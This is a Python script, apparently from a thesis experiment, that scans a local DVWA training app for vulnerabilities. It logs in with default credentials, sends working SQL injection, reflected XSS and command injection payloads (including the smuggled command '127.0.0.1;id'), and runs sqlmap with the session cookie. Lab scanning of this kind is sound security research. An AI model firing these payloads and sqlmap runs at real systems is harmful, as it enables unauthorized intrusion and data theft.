import requests, re, subprocess, sys, os, json

target = "http://127.0.0.1:3002"
TOOLS = "D:\\大论文\\tools"
findings = []
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

s = requests.Session()

# === FIXED DVWA Login ===
r = s.get(target + "/login.php", timeout=5)
token = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
r = s.post(target + "/login.php", data={"username":"admin","password":"password","Login":"Login","user_token":token}, timeout=5)
print("Login: HTTP %d -> %s" % (r.status_code, r.url))

# Verify access
r = s.get(target + "/vulnerabilities/sqli/?id=1", timeout=5)
if "First name" in r.text:
    print("SQLi page: ACCESSIBLE! (%d bytes)" % len(r.text))
else:
    print("SQLi page: BLOCKED (%d bytes)" % len(r.text))

# === Manual SQL injection verification ===
print()
print("=== SQL Injection Test ===")
r = s.get(target + "/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit", timeout=5)
if "First name" in r.text and "Surname" in r.text:
    print("  SQLi CONFIRMED with id=1' OR '1'='1")
    findings.append({"target":"dvwa","scanner":"manual","type":"sql_injection",
        "severity":"critical","url":target+"/vulnerabilities/sqli/",
        "desc":"SQL injection confirmed - id=1' OR '1'='1 returns user data","evidence":r.text[:500]})

# === Manual XSS verification ===
print()
print("=== XSS Test ===")
r = s.get(target + "/vulnerabilities/xss_r/?name=<script>alert(1)</script>", timeout=5)
payload = "<script>alert(1)</script>"
if payload in r.text:
    print("  XSS CONFIRMED - input reflected unencoded!")
    findings.append({"target":"dvwa","scanner":"manual","type":"xss",
        "severity":"high","url":target+"/vulnerabilities/xss_r/",
        "desc":"Reflected XSS confirmed - <script>alert(1)</script> reflected unencoded","evidence":r.text[:500]})
else:
    print("  XSS: Not reflected unencoded (%d bytes)" % len(r.text))

# === Command Injection Test ===
print()
print("=== Command Injection Test ===")
r = s.post(target + "/vulnerabilities/exec/", data={"ip":"127.0.0.1","Submit":"Submit"}, timeout=5)
body = r.text
if "PING" in body and "ttl=" in body.lower():
    print("  Command injection page: Works")
    r2 = s.post(target + "/vulnerabilities/exec/", data={"ip":"127.0.0.1;id","Submit":"Submit"}, timeout=5)
    if "uid=" in r2.text:
        print("  Command injection CONFIRMED with ;id!")
        findings.append({"target":"dvwa","scanner":"manual","type":"command_injection",
            "severity":"critical","url":target+"/vulnerabilities/exec/",
            "desc":"Command injection confirmed - ip=127.0.0.1;id executed","evidence":r2.text[:500]})

# === Run SQLMap ===
print()
print("=== SQLMap ===")
cookie_str = "PHPSESSID=%s; security=low" % s.cookies["PHPSESSID"]
cmd = [sys.executable, "-m", "sqlmap", "-u", target + "/vulnerabilities/sqli/?id=1&Submit=Submit",
       "--cookie", cookie_str, "--batch", "--level", "3", "--risk", "2",
       "--output-dir", "sqlmap_dvwa", "--flush-session", "--answers", "follow=N"]
r = subprocess.run(cmd, capture_output=True, timeout=180)
out = (r.stdout + r.stderr).decode("utf-8", "replace")
for line in out.split("\n"):
    l = line.strip()
    if "is vulnerable" in l.lower() or "injectable" in l.lower():
        print("  SQLMap: %s" % l[:120])
        findings.append({"target":"dvwa","scanner":"sqlmap","type":"sql_injection",
            "severity":"critical","url":target+"/vulnerabilities/sqli/",
            "desc":"SQL injection confirmed by SQLMap: %s" % l[:100],"evidence":l})

# === Summary ===
print()
print("=" * 60)
print("DVWA SCAN RESULTS")
print("=" * 60)
for f in findings:
    print("  [%s] [%s] %s | %s" % (f["severity"][:4], f["scanner"], f["type"], f["desc"][:80]))
print("Total: %d findings" % len(findings))

outpath = "scripts/experiment/real_findings_dvwa.json"
with open(outpath, "w", encoding="utf-8") as f:
    json.dump(findings, f, indent=2, ensure_ascii=False)
print("Saved to: %s" % outpath)
